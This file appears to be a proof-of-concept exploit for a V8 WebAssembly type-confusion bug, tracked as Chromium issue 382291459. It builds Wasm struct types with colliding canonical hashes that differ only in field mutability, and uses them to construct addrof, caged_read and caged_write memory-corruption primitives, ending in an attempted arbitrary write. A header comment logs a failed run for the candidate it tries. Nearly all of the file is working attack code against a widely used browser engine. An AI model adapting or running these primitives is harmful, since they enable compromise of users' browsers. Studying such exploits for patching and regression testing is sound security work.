/*
    https://issues.chromium.org/issues/382291459
    Arbitrary Wasm type confusion due to missing struct field mutability check on canonicalization

    [*] trying {"mut":[503,781655211],"const":[668,252295425],"idx":0}
    [!] CompileError: WebAssembly.Module(): Compiling function #0:"addrof" failed: struct.set[0] expected type (ref null 3), found local.tee of type (ref 5) @+485, retry with next candidate
    test2/regress-382291459.js:122: TypeError: caged_write is not a function
    caged_write(0x42424242, 0x13371447);
    ^
    TypeError: caged_write is not a function
        at test2/regress-382291459.js:122:1
*/

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");


const BRUTE_FIELDS = 30;
const TOTAL_FIELDS = 40;
const colls = [
  {
    // post-592f191
    mut: [0x1f7, 0x2e971cab],   // field[0]: mut ref null any
    const: [0x29c, 0xf09b901],  // field[0]: !mut ref null any
    idx: 0,
  },
];

function convert_to_fields([base, idx], nullify=false) {
  let fields = [];
  for (let i = 0; i < TOTAL_FIELDS - BRUTE_FIELDS; i++) {
    let is_mut = !!(base & (1 << i));
    fields.push(makeField(wasmRefNullType(!is_mut && nullify ? kWasmNullRef : kWasmAnyRef), is_mut));
  }
  for (let i = 0; i < BRUTE_FIELDS; i++) {
    let is_mut = !!(idx & (1 << i));
    fields.push(makeField(wasmRefNullType(!is_mut && nullify ? kWasmNullRef : kWasmAnyRef), is_mut));
  }

  return fields;
}

let instance, addrof, caged_read, caged_write;
for (let coll of colls) {
  try {
    console.log(`[*] trying ${JSON.stringify(coll)}`);
    let builder = new WasmModuleBuilder();

    let $s0 = builder.addStruct([makeField(kWasmI32, true)]);
    let $s1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);
    let $s2 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0), true)]);

    builder.startRecGroup();
    let $s_dst = builder.addStruct(convert_to_fields(coll.mut), kNoSuperType, false);
    builder.endRecGroup();

    builder.startRecGroup();
    let $s_src = builder.addStruct(convert_to_fields(coll.const), kNoSuperType, false);
    builder.endRecGroup();

    builder.startRecGroup();
    let $s_src_none = builder.addStruct(convert_to_fields(coll.const, true), $s_src, false);
    builder.endRecGroup();

    let $sig_i_r = builder.addType(makeSig([kWasmExternRef], [kWasmI32]));
    let $sig_i_i = builder.addType(makeSig([kWasmI32], [kWasmI32]));
    let $sig_v_ii = builder.addType(makeSig([kWasmI32, kWasmI32], []));

    builder.addFunction('addrof', $sig_i_r).addLocals(wasmRefType($s_src_none), 1).addBody([
      kGCPrefix, kExprStructNewDefault, $s_src_none,
      kExprLocalTee, 1,

      kExprLocalGet, 0,
      ...wasmI32Const(0),
      kGCPrefix, kExprStructNew, $s1,
      kGCPrefix, kExprStructSet, $s_dst, ...wasmSignedLeb(coll.idx),

      kExprLocalGet, 1,
      kGCPrefix, kExprStructGet, $s_src_none, ...wasmSignedLeb(coll.idx),
      kGCPrefix, kExprStructGet, $s2, 0,
    ]).exportFunc();

    builder.addFunction('caged_read', $sig_i_i).addLocals(wasmRefType($s_src_none), 1).addBody([
      kGCPrefix, kExprStructNewDefault, $s_src_none,
      kExprLocalTee, 1,

      kExprRefNull, kExternRefCode,
      kExprLocalGet, 0,
      ...wasmI32Const(7),
      kExprI32Sub,
      kGCPrefix, kExprStructNew, $s1,
      kGCPrefix, kExprStructSet, $s_dst, ...wasmSignedLeb(coll.idx),

      kExprLocalGet, 1,
      kGCPrefix, kExprStructGet, $s_src_none, ...wasmSignedLeb(coll.idx),
      kGCPrefix, kExprStructGet, $s2, 1,
      kGCPrefix, kExprStructGet, $s0, 0,
    ]).exportFunc();

    builder.addFunction('caged_write', $sig_v_ii).addLocals(wasmRefType($s_src_none), 1).addBody([
      kGCPrefix, kExprStructNewDefault, $s_src_none,
      kExprLocalTee, 2,

      kExprRefNull, kExternRefCode,
      kExprLocalGet, 0,
      ...wasmI32Const(7),
      kExprI32Sub,
      kGCPrefix, kExprStructNew, $s1,
      kGCPrefix, kExprStructSet, $s_dst, ...wasmSignedLeb(coll.idx),

      kExprLocalGet, 2,
      kGCPrefix, kExprStructGet, $s_src_none, ...wasmSignedLeb(coll.idx),
      kGCPrefix, kExprStructGet, $s2, 1,
      kExprLocalGet, 1,
      kGCPrefix, kExprStructSet, $s0, 0,
    ]).exportFunc();

    instance = builder.instantiate();
    ({addrof, caged_read, caged_write} = instance.exports);

    console.log(`[+] success`);
    break;
  } catch (e) {
    console.log(`[!] ${e}, retry with next candidate`);
  }
}

caged_write(0x42424242, 0x13371447);